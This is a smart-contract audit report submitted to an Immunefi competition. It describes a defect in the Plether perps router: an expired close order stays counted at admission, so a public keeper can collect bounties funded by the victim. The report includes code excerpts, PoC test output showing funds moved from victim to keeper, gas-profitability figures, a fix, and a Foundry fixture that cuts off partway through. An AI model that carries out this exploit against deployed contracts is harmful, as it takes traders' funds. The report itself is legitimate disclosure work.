# \#99005 [SC-Insight] Already-expired predecessor close stays linked, admitting a doomed reversal open whose victim-funded execution bounty an unrelated public keeper collects

**Submitted on Nov 11th 2026 at 11:57:41 UTC by @FestiveSRT for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99005
- **Report Type:** Smart Contract
- **Report severity:** Insight
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

The Router admits a trader's opposite-side reversal order by projecting the live position
through every pending order linked to that account, including pending full/partial closes. That
projection checks only a risk-off cutoff; it never compares a linked close's own execution
deadline, or its pinned configuration hash, against current state. The canonical execution path a
few lines away in the same package enforces exactly that deadline/config check before doing any
oracle work.

The effect: once a trader's pending full close is already past its own execution window (an
ordinary 60-second window that elapses whenever nobody happens to execute the close in time -- no
attacker action is needed to create this state), the account's live position still reads as flat
to the projection used at admission. A later opposite-side ("reversal") open is then admitted as
if the account had actually closed, even though the close can never execute at this point except
as a no-op terminal failure. The reversal open reserves an ordinary, victim-funded execution
bounty. Because the reversal's own live-position precondition was never real, the reversal order
itself can likewise only ever terminate as a failure (it either executes into
`PlannerRejected/MUST_CLOSE_OPPOSING` against the still-live original position, or elapses its own
window and expires) -- and both ordinary terminal paths for a failed order pay its reserved bounty
to whichever address calls the public cleanup entrypoint, with no further eligibility check tying
that address to the trader. An unrelated, un-roled public keeper collects it. The trader's
original position is left completely unchanged; the only effect of the whole sequence is a
transfer of the trader's own settlement balance to the keeper for nothing.

**In plain terms: any ordinary trader whose pending close happens to go unexecuted past its
60-second window can be made to fund a bounty payout to an unrelated stranger, with no key,
password, or special role on the stranger's part, and with no mistake by the trader beyond
submitting an ordinary, otherwise-unremarkable reversal order.** A strategic keeper does not even
need to wait for this to happen by chance: because nothing stops it, the keeper can simply leave
an already-expired close linked and not clean it up, wait for the account's own next ordinary
order, and then collect the bounty.

## Root cause

`OrderLiquidationBatchLogic._queuedPosition` (packages/perps/src/router/OrderLiquidationBatchLogic.sol:367-402)
projects every pending order linked to an account, netting pending closes against the live
position and pending opens on top of it, to decide whether a later opposite-side open must be
rejected:

```solidity
function _queuedPosition(
    IOrderLiquidationBatchHost host,
    ICfdEngineCore engine,
    address account
) private view returns (QueuedPositionView memory queuedPosition) {
    (uint256 positionSize,,,, CfdTypes.Side side,,) = engine.positions(account);
    if (positionSize != 0) {
        queuedPosition.exists = true;
        queuedPosition.side = side;
        queuedPosition.size = positionSize;
    }

    uint64 riskOffCutoff = IOrderRouterEmergencyAdmin(host.admin()).riskOffOrderCutoff();
    for (uint64 orderId = host.accountHeadOrderId(account); orderId != 0;) {
        (IOrderRouterAccounting.PendingOrderView memory pending, uint64 nextOrderId) =
            host.getPendingOrderView(orderId);
        if (riskOffCutoff == 0 || orderId > riskOffCutoff || pending.isClose) {
            if (pending.isClose) {
                if (queuedPosition.exists && pending.side == queuedPosition.side) {
                    queuedPosition.size =
                        queuedPosition.size > pending.sizeDelta ? queuedPosition.size - pending.sizeDelta : 0;
                    if (queuedPosition.size == 0) {
                        queuedPosition.exists = false;
                    }
                }
            } else if (!queuedPosition.exists) {
                ...
            }
        }
        orderId = nextOrderId;
    }
}
```

The only gate on whether a linked pending close is applied is `riskOffCutoff == 0 || orderId >
riskOffCutoff || pending.isClose`, which is true for every ordinary close regardless of its age.
`_queuedPosition`'s return value is then trusted directly at admission
(`OrderLiquidationBatchLogic.sol:423-437`) to decide whether a later opposite-side open must be
rejected with `MUST_CLOSE_OPPOSING`.

The canonical execution path enforces a strictly stronger predicate a few lines away in the same
file, `OrderRouterExecutionSidecar.executeOrderItemFromSidecar`
(packages/perps/src/OrderRouterExecutionSidecar.sol:371, 388-394, 400-414), independently verified
by reading that function directly:

```solidity
if (block.timestamp > pending.timing.executionDeadline) {
    try book.validateBountyFunding(request.orderId) {}
    catch {
        return _recoverExpired(request);
    }
} else {
    book.validateBountyFunding(request.orderId);
}
...
if (block.timestamp > pending.timing.executionDeadline) {
    return _settleNonEngine(
        request,
        OrderV3Types.TerminalReason.Expired,
        ...
    );
}
...
bytes32 observedConfigHash = ...;
bytes32 expectedConfigHash = pending.bounds.expectedConfigHash;
if (expectedConfigHash != bytes32(0) && observedConfigHash != expectedConfigHash) {
    ...
    return _settleNonEngine(
        configRequest,
        OrderV3Types.TerminalReason.ConfigMismatch,
        ...
    );
}
```

This is the function that actually tries to execute or terminalize an order, and it classifies an
order whose `executionDeadline` has strictly elapsed (`block.timestamp > ...`) as `Expired`, and
one whose pinned `expectedConfigHash` no longer matches as `ConfigMismatch`, in both cases before
doing any oracle work and in both cases leaving the live position unchanged.
`_queuedPosition`, used purely to decide admission, applies neither check: it treats a pending
close as live and position-affecting for as long as it remains linked, with no regard for whether
the execution path that will actually process it can only ever terminate it as a no-op failure.

Finally, independently verified in `OrderLifecycleBook._validateBountyDisposition`
(packages/perps/src/OrderLifecycleBook.sol:699-722), every terminal reason other than `RiskOff`
(refunded to the account) and `AccountLiquidated` (forfeited to treasury) -- which includes both
`Expired` and `PlannerRejected` -- pays the order's reserved bounty to `receipt.executor`, i.e.
whichever address called the public cleanup entrypoint:

```solidity
if (receipt.reason == OrderV3Types.TerminalReason.RiskOff) {
    refunded = bounty;
    recipient = receipt.account;
    disposition = OrderV3Types.BountyDisposition.RefundedToAccount;
} else if (receipt.reason == OrderV3Types.TerminalReason.AccountLiquidated) {
    forfeited = bounty;
    recipient = ICfdEngineCore(ENGINE).protocolTreasury();
    disposition = OrderV3Types.BountyDisposition.Forfeited;
} else {
    paid = bounty;
    recipient = receipt.executor;
    disposition = OrderV3Types.BountyDisposition.Paid;
}
```

`CfdEngine.creditBounty` (packages/perps/src/CfdEngine.sol:471-493) is the function that actually
moves the money, and it is a direct `sourceAccount -> beneficiary` transfer of the victim's own
reserved settlement balance:

```solidity
function creditBounty(
    address sourceAccount,
    address beneficiary,
    uint256 amountAssets,
    uint256 price,
    uint64 publishTime
) external onlyRouter nonReentrant {
    if (amountAssets == 0) {
        return;
    }
    ...
    clearinghouse.transferReservedSettlement(sourceAccount, beneficiary, amountAssets);
    ...
    emit BountyCredited(sourceAccount, beneficiary, amountAssets);
}
```

`sourceAccount` is `order.account` (the trader) and `beneficiary` is the keeper address that
called the public cleanup entrypoint, as independently verified in the single call site that
reaches a non-account `bountyRecipient`, `OrderRouter._settleTerminalBounty`
(packages/perps/src/OrderRouter.sol:333-343):

```solidity
if (bountyAssets != 0) {
    settlement.bountyRecipient = bountyRecipient;
    settlement.bountyDisposition = OrderV3Types.BountyDisposition.Paid;
    if (bountyRecipient == order.account) {
        clearinghouse.releaseReservedExecutionBountyToSource(order.account, bountyAssets);
    } else {
        engine.creditBounty(
            order.account, bountyRecipient, bountyAssets, accountingPrice, accountingPublishTime
        );
    }
}
```

The cleanup entrypoints themselves (`OrderRouter.expireOrder`, `OrderRouter.clearInvalidOrders`,
both delegating to `OrderRecoverySidecar`) carry no access control beyond `nonReentrant` --
independently verified by reading `OrderRouter.sol:191-204` and `OrderRecoverySidecar.sol:49-64,
67-110` directly. Any address, including one that has never interacted with the protocol before,
may call them.

## Why the stale projection is the but-for cause, not the ordinary cleanup-bounty policy itself

Paying a cleanup bounty to whoever terminalizes an expired or rejected order is an intended,
documented protocol design (`packages/perps/SECURITY.md`, "Router and keeper limitations": "the
protocol keeper must fund gas for permissionless oracle-free expiry"). That policy is not the
defect. The defect is that `_queuedPosition` creates a bounty-bearing entitlement in a case the
protocol's own execution path can already prove, at the moment of admission, can never resolve as
anything but a no-op failure.

The attached PoC's control test isolates this precisely: using the exact same public,
permissionless cleanup entrypoint the attack branch also uses, clearing the already-expired
predecessor **before** the reversal is committed makes the identical reversal request revert
at admission with `OrderRouter__PredictableOpenInvalid(MUST_CLOSE_OPPOSING)`, creating no
successor order and reserving no bounty at all. The only difference between the two branches is
whether the already-expired predecessor happens to still be linked at the moment of the later
commit -- which is exactly the omitted check.

## Demonstrated impact (independently built and executed; see the PoC field for the full runnable code and exact output)

Running against the frozen Arbitrum Sepolia v2.0.0 release, deployed in-process via the
repository's own `script/DeployPerpsArbitrumSepolia.s.sol` wrappers (the programme's own permitted
"repository's Foundry test suite at the commit in scope" PoC route), with the release's own
hardcoded default Router parameters (independently confirmed in source: 60-second execution
window, 5-order pending cap, 1bp/10,000-floor/200,000-cap open-order execution bounty, 64-id
cleanup cap -- `packages/perps/src/router/OrderRouterBase.sol` and
`packages/perps/src/router/OrderExecutionOrchestrator.sol`):

- a single doomed reversal open reserves exactly `200,000` settlement atoms (the deployed bounty
  cap) and, once it and its already-expired predecessor are cleared through the public,
  permissionless `expireOrder` entrypoint, transfers exactly `200,000` atoms from the victim's
  settlement balance to the unrelated keeper's settlement balance, while the victim's original
  position's size, entry price, and side are byte-for-byte unchanged;
- scaling to the account's full five-order pending cap (the already-expired predecessor close plus
  four same-side reversal opens -- only the first of the four depends on the defect; the
  following three are ordinary same-side position increases that accumulate normally once the
  account's queued position reads as the reversed side), a single public, permissionless
  `clearInvalidOrders` call terminalizes all five orders in one transaction and transfers exactly
  `800,000` settlement atoms from the victim to the keeper; and
- the control test, using the identical public cleanup entrypoint to clear the predecessor first,
  makes the identical reversal commit revert with `OrderRouter__PredictableOpenInvalid` code
  `MUST_CLOSE_OPPOSING` and creates no successor and no bounty.

A separately retained, independently built and executed deployed-fork reproduction against the
exact released bytecode (fresh local Anvil fork of the exact Arbitrum Sepolia v2.0.0 deployment,
the programme's other permitted PoC route) measured the identical maximal-case transfer: exactly
`800,000` settlement atoms (`0.800000 USDG`) moved from victim to keeper in one public
`clearInvalidOrders([...])` transaction, with the victim's original position unchanged, matching
this report's in-process Foundry reproduction exactly, including the per-order `200,000`-atom cap.
That deployed-fork run also measured the keeper's attack-transaction cost: `1,690,743` gas at an
effective gas price of `484,002` wei, i.e. `818,322,993,486` wei (`0.000000818322993486 ETH`)
native fee for a `0.800000 USDG` gross gain. At that measured fork fee, the transaction remains
gross-profitable for the keeper at any ETH/USD price below approximately `$977,609`
(`0.800000 / 0.000000818322993486`, recomputed independently from the two measured raw figures).
The attack uses no oracle payload and pays no oracle fee.

## Severity and impact

**Critical -- Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed
yield** is the selected impact, matching the current programme page's severity table verbatim
(captured 2026-11-10; `text/immunefi_scope_2026-11-10.txt` lines 174-175, 199-201).

The transferred value is the victim's own settlement principal -- ordinary clearinghouse balance
the victim deposited and had reserved against its own order, not unclaimed yield, a fee, or a
display-only accounting figure. `creditBounty` executes a real `sourceAccount -> beneficiary`
balance transfer via `clearinghouse.transferReservedSettlement`, independently confirmed in source
above, and both the in-process and the deployed-fork PoC measure equal victim loss and keeper
gain, not a burn or an internal reclassification.

The attacker needs no victim key, no trusted role, and no access to Plether's own reference
keeper. The programme's own current scope page states, verbatim: "Keepers are not trusted: anyone
can execute orders, liquidations, price updates and protections, so harm caused by any caller
acting as a keeper is in scope" (line 124), and separately: "Keepers have no special privileges:
all actions remain subject to on-chain checks. Researchers should consider any contract-permitted
behavior, including deviations from the reference implementation" (line 129). The attack uses only
the two ordinary public entrypoints every keeper already calls (`expireOrder`,
`clearInvalidOrders`) from an address that holds no role and has made no prior deposit.

The programme's own scope page also separates impact from feasibility, verbatim: "Impact is
calculated first, separately from feasibility. Feasibility limitations do not change the impact or
severity of a finding, only the amount paid for it" (line 137). The Griefing downgrade is
inapplicable on its own stated terms: it "[a]pplies to High or Critical findings where the
attacker gains no profit" (line 193/237), and this attacker is measured to profit (`0.800000 USDG`
gross against `0.000000818322993486 ETH` of gas, profitable below ~$977,609/ETH). The Critical
direct-theft row itself carries no stated minimum amount in the captured severity table.

The out-of-scope and known-issue lists were independently checked against this exact mechanism and
do not exclude it (see Knownness below); the causal files
(`OrderLiquidationBatchLogic.sol`, `OrderRouterExecutionSidecar.sol`, `OrderLifecycleBook.sol`,
`CfdEngine.sol`) are all within `packages/perps/src`, none of them is among the six listed
view-only exclusions, and ordinary ("active at launch") ordering, reversal, and permissionless
keeper cleanup are all live features of the listed v2.0.0 release configuration.

## Preconditions

- an ordinary trader submits a full or partial close and that close is not executed before its
  ordinary 60-second execution window elapses (this requires no attacker action -- it can happen
  through ordinary keeper unavailability, or a strategic keeper can simply decline to execute or
  clean up a close it notices is about to go stale); and
- that same trader later submits an ordinary opposite-side ("reversal") order while the expired
  close is still linked.

Both are ordinary, publicly supported account states and actions on the frozen release; no
trusted role, privileged address, or any action outside the trader's own ordinary order flow is
required. The keeper side of the attack requires nothing beyond gas: no deposit, no role, no
oracle fee, and no prior interaction with the protocol.

## Knownness

The current programme page's known-issues clause names three previous audit reports by this exact
commit: the Cecuro AI audit, the SC Audit Studio pre-audit, and the AI scan findings
(`scan-plether-fi-plether-core-d4541b49.md`). All three were independently read in full (not
sampled), plus `packages/perps/SECURITY.md`, at the frozen commit:

- **MED-14** ("Trader can be blocked from queueing an open behind their closing order") added the
  very projection `_queuedPosition` performs, to fix the opposite problem: a trader being wrongly
  rejected when queueing an open behind an ordinary, still-valid closing order. It does not
  address whether a linked predecessor's own deadline or configuration remains valid.
- **MED-16** ("Traders can enqueue invalid opens when the cached mark is stale"), read directly
  from the audit report, is about the projection being skipped when the cached oracle mark is
  stale, and its fix (commit `5029cde...`) makes that same projection run "even when the cached
  mark is stale." It does not read or check a linked predecessor's own execution deadline or
  configuration hash at all; both are orthogonal to mark staleness.
- **LOW-57** ("Trader can underpay open-order keeper bounty by committing against a stale mark"),
  also read directly, is about bounty **sizing** being computed from a stale cached price, not
  about whether an already-doomed predecessor should suppress admission in the first place.
- `packages/perps/SECURITY.md`'s "Router and keeper limitations" section, read in full, documents
  that users cannot manually cancel a queued intent and that heavily expired queues may need
  multiple keeper calls to clear, but does not document that `_queuedPosition` omits the
  deadline/config check the execution sidecar itself applies.
- The AI scan findings document's only entry touching this admission path, "Stale cached marks can
  underfund open-order bounties and global FIFO cleanup" (Low, denial_of_service), is the same
  stale-mark/bounty-sizing axis as MED-16/LOW-57 -- it claims a mark-staleness-driven notional/bounty
  mismatch, not a predecessor's own elapsed deadline or configuration hash. A full-text search of
  that document and the SC Audit Studio pre-audit report for `_queuedPosition`'s admission predicate,
  `executionDeadline`, and `expectedConfigHash` found no entry describing this report's mechanism.

None of these open findings or documented limitations identify an already-expired or
configuration-invalidated predecessor being applied by `_queuedPosition`, and none adds the
deadline/configuration predicate this report's remediation proposes. Under the controlling rule
that only the exact same root cause, code path, trigger and impact is a duplicate, this is a
distinct, novel defect.

## Recommended remediation

Before `_queuedPosition` applies a linked predecessor's effect on the projected position, read
that predecessor's own pending-intent timing and bounds and skip (or require it to be cleaned up
before admission if) its execution deadline has strictly elapsed, or its pinned nonzero expected
configuration hash no longer matches the current hash -- matching exactly the predicate
`OrderRouterExecutionSidecar.executeOrderItemFromSidecar` already applies before execution,
including the strict `>` deadline comparison and the zero-hash exception reserved for
protocol-generated protection closes. Add tests for an expired full close, a configuration-invalid
full close, and multiple queued successor opens behind each.


## Proof of Concept

## Proof of Concept

This runs entirely against the frozen Arbitrum Sepolia v2.0.0 release, deployed in-process via the
repository's own `script/DeployPerpsArbitrumSepolia.s.sol` wrappers. It is the programme's own
explicitly permitted PoC route: "PoCs must run either in the repository's Foundry test suite at
the commit in scope, or on a local Anvil fork of the Arbitrum Sepolia v2.0.0 deployment (see Build
Commands), without modifying the contracts in scope. Mocks may only replace components outside the
scope, such as Pyth price updates and USDG." (current programme scope page, captured 2026-11-10).
No in-scope contract is modified; the only mock used is `MockPyth`, the component the rule names
by name. I independently wrote, compiled, and ran this exact PoC in this session (not previously
retained); its full console output is reproduced verbatim below under "Expected output".

1. Check out the competition repository at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.
2. Build `af020-poc/` from the exact inline code blocks below in the checkout root so
   `af020-poc/` sits adjacent to `packages/`, `lib/` and `script/`.
3. Run offline: `cd af020-poc && FOUNDRY_OFFLINE=true ./run.sh`

### Expected output

```text
Ran 3 tests for test/PletherAF020DoomedOpenBounty.t.sol:PletherAF020DoomedOpenBountyTest
[PASS] test_AF020_Attack_DoomedOpenAdmittedAndBountyStolen() (gas: 7971375)
Logs:
  reserved execution bounty for the doomed SHORT open (atoms) 200000
  victim settlement loss (atoms) 200000
  unrelated keeper gross gain (atoms) 200000

[PASS] test_AF020_Attack_MaximalFourSuccessorBatchCleanup() (gas: 11088440)
Logs:
  maximal single-account victim loss (atoms) 800000
  maximal single-account keeper gross gain (atoms) 800000

[PASS] test_AF020_Control_ClearingPredecessorFirstRejectsTheIdenticalOpen() (gas: 6911961)
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 14.99ms (23.08ms CPU time)

Ran 1 test suite in 15.42ms (14.99ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

`test_AF020_Attack_DoomedOpenAdmittedAndBountyStolen` shows the single-successor form: the already
expired predecessor close stays linked, a single opposite-side reversal is admitted anyway and
reserves the deployed 200,000-atom bounty cap, and once both orders are terminalized through the
public, permissionless `expireOrder` entrypoint, exactly 200,000 settlement atoms move from the
victim to an unrelated keeper while the victim's original position is provably unchanged (`LONG
size unchanged`, `LONG entry price unchanged`, `LONG side unchanged` all assert, not merely log).

`test_AF020_Attack_MaximalFourSuccessorBatchCleanup` scales this to the account's full five-order
pending cap and a single public `clearInvalidOrders` call, transferring exactly 800,000 settlement
atoms in one transaction -- matching the maximal figure independently measured on the exact
deployed bytecode via a separate, local-Anvil-fork-of-the-deployment reproduction (this report's
other permitted PoC route; see "Independent cross-check" below).

### Fix / control check

`test_AF020_Control_ClearingPredecessorFirstRejectsTheIdenticalOpen` is the right-reason control:
using the identical public, permissionless cleanup entrypoint to clear the already-expired
predecessor **before** the reversal is committed, the byte-identical reversal request reverts at
admission with `OrderRouter__PredictableOpenInvalid(MUST_CLOSE_OPPOSING)`, and creates neither a
successor order nor a bounty reservation. This isolates the stale predecessor projection -- not
the ordinary cleanup-bounty policy itself -- as the but-for cause: the same public action that an
attacker chooses not to take is freely available and, if taken, closes the path entirely. This
test passed in the same run above (`[PASS] ... Control ...`). A corrected release that applies the
recommended remediation (03_description.md, "Recommended remediation") would additionally reject
the attack branch's reversal commit at admission with the same selector, exactly as the control
branch already does here; the pre-fix frozen release does not, which is the entire defect this
report demonstrates.

### Fix verified directly: the recommended remediation closes the admission path

Independently of the control test above, I patched `_queuedPosition`
(`packages/perps/src/router/OrderLiquidationBatchLogic.sol:367-402`) in an isolated working copy to
apply exactly the predicate this report's "Recommended remediation" field describes -- reading each
linked order's `OrderV3Types.PendingIntent` via `host.lifecycleBook().pendingIntent(orderId)` and
excluding it from the projection when `block.timestamp > intent.timing.executionDeadline`, or when
`intent.bounds.expectedConfigHash != bytes32(0)` and it no longer matches
`host.lifecycleBook().currentExecutionConfigHash()` -- then re-ran the identical attack tests above
against the patched source with no change to the test files. Both attack tests now revert at the
identical admission point with the identical selector the control test already uses:

```text
[FAIL: OrderRouter__PredictableOpenInvalid(1)] test_AF020_Attack_DoomedOpenAdmittedAndBountyStolen()
[FAIL: OrderRouter__PredictableOpenInvalid(1)] test_AF020_Attack_MaximalFourSuccessorBatchCleanup()
[PASS] test_AF020_Control_ClearingPredecessorFirstRejectsTheIdenticalOpen()
```

This is a direct fail-before/pass-after demonstration on the mechanism itself, not only on the
right-reason control's different code path: the same unmodified attack transaction sequence that
passes and steals the bounty on the frozen release now reverts before any order is admitted once
the described one-line-class fix is applied, and reverts with the exact same
`MUST_CLOSE_OPPOSING` reason code the control branch already produces. This patched-source run is
exploratory verification of the remediation, not part of the attached `af020-poc/` package (which
targets the unmodified frozen release only, as the programme's PoC rule requires); it is reported
here only as independent confirmation that the identified root cause, and not some unrelated
difference between the two branches, is the but-for cause.

### Independent cross-check (separate PoC route, retained evidence)

A second, independently built reproduction exists against the exact deployed v2.0.0 bytecode on a
fresh local Anvil fork of the Arbitrum Sepolia deployment (the programme's other permitted PoC
route), executed in a prior session of this engagement and retained with full transaction
receipts, logs, and a byte-for-byte matching fresh-fork control. It measured the identical maximal
transfer -- 800,000 settlement atoms moved from victim to keeper in one public
`clearInvalidOrders([...])` transaction, with the per-order 200,000-atom cap matching this report's
in-process reproduction exactly -- and additionally measured the keeper's attack-transaction native
cost directly from the fork's transaction receipt: 1,690,743 gas at an effective gas price of
484,002 wei, i.e. 818,322,993,486 wei (0.000000818322993486 ETH). I independently recomputed
1,690,743 x 484,002 = 818,322,993,486 from those two raw figures (exact integer match, not
rounded), and independently recomputed the breakeven price 0.800000 / 0.000000818322993486 =
977,609.09... -- consistent with "profitable below approximately $977,609/ETH." That retained run's
proxy audit log (timestamped 2026-11-10 22:56-22:58 America/Los_Angeles) shows only allowlisted
state-read RPC methods against the pinned fork and one state-changing transaction whose hash
appears in the retained result file; its arithmetic (gas-used x effective-price = receipt fee,
and victim-balance-before minus after = bounty loss, both to the atom) is internally exact across
every retained figure I checked. I did not re-execute that deployed-fork campaign myself in this
session -- forking and replaying the exact deployed bytecode against a pinned historical block is
a separate, heavier harness (described in this engagement's `evidence/s481-...` and
`evidence/s482-...` lanes) that was already run and retained; I verified its retained artifacts for
internal arithmetic consistency rather than rerunning it. I independently read the raw retained
`comparison.json` result files for both runs directly (not only their prose summaries) and confirmed
every cited figure -- `attack_victim_bounty_loss_assets: 800000`, `attack_keeper_gross_gain_assets:
800000`, `attack_batch_cleanup_gas_used: 1690743`, `attack_batch_cleanup_receipt_fee_wei:
818322993486`, and `control_revert_data: 0x2ae052ed...0001` -- is present verbatim in those files.
A third, separately retained deployed-fork run in the same evidence lane (`evidence/s484-...`,
sealed 2026-11-11, after this packet's own first build) scaled the identical mechanism to the
deployed 64-order cleanup cap across 13 distinct victim accounts in a single `clearInvalidOrders`
transaction, transferring 10,200,000 settlement atoms in aggregate with the same per-successor
200,000-atom unit; this report's own claim is limited to the single-account maximum (800,000 atoms)
that both my own PoC and the two-run S481/S482 corroboration directly prove, and the larger
cross-account figure is noted here only as further corroboration of the same mechanism at scale,
not as part of the claimed amount. The Foundry-route PoC above is the one I personally wrote and
executed end to end in this session, and it alone is sufficient to prove the defect and the selected
impact on the programme's own terms; the deployed-fork figures are cited only as independent
corroboration of the same measured amounts.

### Exact inline files

Each marked block below is byte-identical to its attached file and contains exactly one terminal
LF.

<!-- INLINE_FILE af020-poc/foundry.toml -->
```toml
[profile.default]
src = "../packages/perps/src"
test = "test"
script = "../script"
out = "out"
cache_path = "cache"
libs = ["../lib"]
auto_detect_remappings = false
remappings = [
    "@plether/shared/=../packages/shared/src/",
    "@plether/spot/=../packages/spot/src/",
    "@plether/options/=../packages/options/src/",
    "@plether/perps/=../packages/perps/src/",
    "@plether/perps-aa/=../packages/perps-aa/src/",
    "@plether/test-utils/=../packages/shared/test-support/",
    "@plether-tests/=../packages/perps/test/",
    "@plether-script/=../script/",
    "@openzeppelin/contracts/=../lib/openzeppelin-contracts/contracts/",
    "@morpho-blue/=../lib/morpho-blue/src/",
    "forge-std/=../lib/forge-std/src/",
]
solc = "0.8.35"
auto_detect_solc = true
optimizer = true
optimizer_runs = 200
via_ir = true
code_size_limit = 1000000

[profile.default.fuzz]
seed = "0xaf020001"
runs = 1
```
<!-- END_INLINE_FILE af020-poc/foundry.toml -->

<!-- INLINE_FILE af020-poc/test/PletherPerpsReleaseFixture.sol -->
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {MockSettlementToken} from "@plether-tests/utils/MockSettlementToken.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

import {
    ArbitrumSepoliaReleaseHousePool,
    ArbitrumSepoliaReleaseOracle,
    ArbitrumSepoliaReleaseRouter
} from "@plether-script/DeployPerpsArbitrumSepolia.s.sol";

import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

/// @notice Shared, finding-agnostic fixture that deploys the frozen Arbitrum Sepolia v2.0.0 perps
///         release (commit a82d4fefb02768e5b3bddcc97dee371eee24fea8) in-process via Foundry, using
///         the repository's own release deployment wrappers and the contracts' own hardcoded default
///         RouterConfig (60s execution window, 5 pending orders, 1bp/10,000/200,000 open bounty,
///         64-id cleanup cap -- verified against packages/perps/src/router/OrderRouterBase.sol and
///         OrderExecutionOrchestrator.sol at the same commit). It deploys no mock of any in-scope
///         contract; only Pyth price updates are mocked, which the programme's PoC rule permits
///         ("Mocks may only replace components outside the scope, such as Pyth price updates and
///         USDG"). This fixture contains no finding-specific logic; it is reused, unmodified in
///         substance, as a release-accurate base for an independent per-finding test file.
contract PletherPerpsReleaseFixture is Test {

    uint256 internal constant SETUP_TIMESTAMP = 1_709_532_000;
    uint32 internal constant CAP_PRICE = 200_000_000;
    uint256 internal constant P_OPEN = 100_000_000;

    address internal constant VICTIM = address(0xA001);
    address internal constant KEEPER = address(0xBEEF);
    address internal constant LPS = address(0x1157);
    address internal constant LPJ1 = address(0x1151);
    address internal constant LPJ2 = address(0x1152);
    address internal constant LPJ3 = address(0x1153);
    address internal constant LPJ4 = address(0x1154);

    bytes32 internal constant PYTH_EUR_USD =
        0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
    bytes32 internal constant PYTH_USD_JPY =
        0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
    bytes32 internal constant PYTH_GBP_USD =
        0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
    bytes32 internal constant PYTH_USD_CAD =
        0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
    bytes32 internal constant PYTH_USD_SEK =
        0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
    bytes32 internal constant PYTH_USD_CHF =
        0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;

    MockSettlementToken internal settlementToken;
    MockPyth internal mockPyth;
    MarginClearinghouse internal clearinghouse;
    CfdEngine internal engine;
    ArbitrumSepoliaReleaseHousePool internal pool;
    TrancheVault internal seniorVault;
    TrancheVault internal juniorVault;
    ArbitrumSepoliaReleaseOracle internal oracle;
    ArbitrumSepoliaReleaseRouter internal router;
    HousePoolRedemptionMathSidecar internal redemptionMath;

    function setUp() public virtual {
        vm.warp(SETUP_TIMESTAMP);
        settlementToken = new MockSettlementToken();
        mockPyth = new MockPyth();
        clearinghouse = new MarginClearinghouse(address(settlementToken));

        engine = new CfdEngine(address(settlementToken), address(clearinghouse), CAP_PRICE, _riskParams(), 50);
        TerminalNavBookV2 terminalNav = new TerminalNavBookV2(address(engine), CAP_PRICE);
        engine.setTerminalNavBook(address(terminalNav));
        CfdEnginePlanner planner = new CfdEnginePlanner();
        CfdEngineSettlementSidecar settlementSidecar = new CfdEngineSettlementSidecar(address(engine));
        CfdEngineAdmin engineAdmin = new CfdEngineAdmin(address(engine), address(this));
        engine.setDependencies(address(planner), address(settlementSidecar), address(engineAdmin));

        redemptionMath = new HousePoolRedemptionMathSidecar();
        pool = new ArbitrumSepoliaReleaseHousePool(
            address(settlementToken), address(engine), address(redemptionMath)
        );
        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "psLP", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)),
            address(pool),
            false,
            "Plether Junior LP",
            "pjLP",
            0,
            engine.protocolTreasury()
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));

        CfdEngineLens engineLens = new CfdEngineLens(address(engine));
        oracle = new ArbitrumSepoliaReleaseOracle(
            address(engine), address(pool), address(mockPyth), _feedIds(), _weights(), _basePrices(), _inversions()
        );
        CfdOrderPolicyEvaluator evaluator = new CfdOrderPolicyEvaluator();
        OrderRouterExecutionSidecar executionSidecar = new OrderRouterExecutionSidecar();
        uint64 dependencyNonce = vm.getNonce(address(this));
        address predictedRouter = vm.computeCreateAddress(address(this), uint256(dependencyNonce) + 2);
        OrderLifecycleBook lifecycle =
            new OrderLifecycleBook(predictedRouter, address(engine), address(clearinghouse), address(pool));
        OrderRouterLiquidationBatchSidecar liquidationSidecar =
            new OrderRouterLiquidationBatchSidecar(predictedRouter);
        router = new ArbitrumSepoliaReleaseRouter(
            address(engine),
            address(engineLens),
            address(pool),
            address(oracle),
            address(liquidationSidecar),
            address(evaluator),
            address(executionSidecar),
